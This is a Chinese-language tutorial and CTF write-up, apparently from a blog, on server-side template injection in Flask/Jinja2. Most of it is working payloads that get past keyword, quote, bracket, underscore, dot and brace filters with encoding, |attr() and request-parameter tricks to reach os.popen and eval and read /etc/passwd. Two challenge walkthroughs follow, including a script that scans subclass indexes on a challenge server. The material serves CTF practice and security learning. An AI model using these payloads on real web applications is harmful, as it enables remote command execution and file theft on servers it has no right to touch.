单双引号都行，假如过滤了flag时，我们可以使用`fl''ag`或者`fl""ag`的形式来绕过
例如
    ().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()
    [].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
只要是字符串的，即payload中引号内的，都可以用引号绕过
#### 利用join()函数绕过
我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：
    [].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
这也是基于对PHP函数命令的理解来的。
### 绕过其他字符
#### 过滤了中括号`[]`
##### 利用`__getitem__()`绕过
可以使用 **getitem** ()方法输出序列属性中某个索引处的元素（相当于[]），例如
    >>> "".__class__.__mro__[2]
    >>> "".__class__.__mro__.__getitem__(2)
所以我们可以得到
    []=__getitem__()
例子
    {{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性
    {{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
##### 利用字典读取绕过
我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号`[]`里来访问，一种就是用点`.`来访问。所以，当方括号`[]`被过滤之后，我们还可以用点`.`的方式来访问，如下示例
首先构造
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
绕过后
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
    不难看出['__builitins__']=.__builtins__.
    所以可以['']=..
#### 过滤了引号`''""`
##### 利用chr()绕过
因为知识比较匮乏，所以补充了一下`chr()`函数是干啥的
* * *
描述
chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。
语法
以下是 chr() 方法的语法:
    chr(i)
参数
  * i -- 可以是10进制也可以是16进制的形式的数字。
返回值
返回值是当前整数对应的 ASCII 字符。
* * *
所以`chr()`这个函数可以绕过直接输入，利用返回的相对应的ASCll字符来执行命令
但是我们没法直接使用chr函数，所以我们需要先通过`__builtins__`来找到它（`__builtins__`方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数。）
    {% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}
然后我们再去赋值给chr，后面拼接字符串
    {{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
整合在一起就变成了
    {% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
等同于
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
##### 利用request对象绕过
request有两种形式，`request.args`和`request.values`，当args被过滤时我们可以使用values，且这种方法POST和GET传递的数据都可以被接收，相对于通过`chr()`进行绕过，这种方法更为简单和便捷。
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
构造后为
    {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
#### 过滤了下划线`_`
##### 利用request对象绕过
又用到了这种方法，看来这种方法十分强大
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
构造后为
    {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
#### 过滤了点`.`
##### 利用`|attr()`绕过
`|attr()`为jinja2原生函数，是一个过滤器，它只查找属性获取并返回对象的属性的值，过滤器与变量用管道符号（ `|`
）分割，它不止可以绕过点。所以可以直接利用，即
    ().__class__   相当于  ()|attr("__class__")
构造一个
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
过滤后为
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
`|attr()`配合其他绕过方法可以同时绕过下划线、引号、点、中括号等。
##### 利用中括号`[]`绕过
使用中括号直接进行拼接
    {{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
过滤后为
    {{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
同时，我们可以发现,这样绕过点之后，我们几乎所有的关键字都成了字符串，我们就可以用上面的一些方法绕过了，比如hex编码，这样我们几乎可以绕过全部的过滤。
##### 过滤了大括号`{{`
我们可以用Jinja2的`{%...%}`语句装载一个循环控制语句来绕过，这里我们在一开始认识flask的时候就学习了：
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
这里在一开始的时候通过`{%...%}`载入了两个循环语句，通过for和if遍历函数，寻找出`'catch_warnings'`这一命令然后将其命名为c，再通过找出的c命令组合构造语句，执行命令，最后用在引入两个end语句来终止前面的for和if的循环语句。
也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：
    {% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
也可以用 `{%print(......)%}` 的形式来代替`{{ }}`，如下：
    {%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
### 组合绕过
以下摘抄了S神的绕过姿势，tql。
* * *
#### 同时过滤了 . 和 []
`|attr()`+`__getitem__`
**绕过姿势：**
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
**等同于：**
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
#### 同时过滤了 __ 、点. 和 []
`__getitem__`+`|attr()`+`request`
    {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
**相当于：**
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
#### 配合Unicode编码绕过很多过滤
    '  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__
我们用`{%...%}`绕过对 `{{`
的过滤，用`|attr()`绕过`.`，并用unicode绕过对关键字的过滤，然后`__getitem__`绕过中括号。
**如下，后面的命令其实也可以换掉，但是没过滤，就先不换了：**
    {{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
**等同于：**
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
#### 配合Hex编码绕过很多过滤
**和上面Unicode的环境一样，方法也一样，就是换了种编码**
**如下**
    {{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
**等同于：**
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
**大家可以发现这几种方法中都用到了**`|attr()`，前面也说过，这是 JinJa 的一种过滤器，下面我们可以详细了解一下 JinJa
的过滤器，以便我们加深对绕过的理解，以及研究以后新的绕过。
* * *
## 刷题看看
### 一个实例 [题目
(xctf.org.cn)](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=2)Web_python_template_injection
#### 1.判断有无模板注入
    http://111.200.241.244:61745/{{1+1}}
#### 2.查看一下全局变量
    url/{{config}}
补个知识
文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。  
思路：找到父类–>寻找子类–>找关于命令执行或者文件操作的模块。
可能用到的魔术方法列举一下
    __class__  返回类型所属的对象
    __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
    __base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的
    __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
    __init__  类的初始化方法
    __globals__  对包含函数全局变量的字典的引用
#### 3.寻找可用引用
    {{''.__class__.__mro__[2].__subclasses__()}}
可以看到在40的位置有一个type file类型（可以进行文件读取）
    {{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
可以看到7有一个类型（可以进行命令执行）
    {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
#### 4.读取flag
    {{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
    ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}
### ctfshow web361
题目说名字就是考点
所以传参为`?name=`
传入?name={undefinde{1+1}}回显2
这里利用`os._warp_close`类，一看有不少，写个脚本来找吧
    import requests
    from tqdm import tqdm
    for i in tqdm(range(233)):
        url = 'http://3b571901-c1e3-41a6-96b3-605942386ec5.challenge.ctf.show/?name={{%22%22.__class__.__bases__[0].__subclasses__()['+str(i)+']}}'
        r = requests.get(url=url).text
        if('os._wrap_close' in r):
            print(i)
输出132
然后利用`. init .globals`来找os类中的。init初始化，globals全局查找
    ?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__}}
其中能看到popen，于是利用其来执行命令
    ?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}
payload:
    ?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}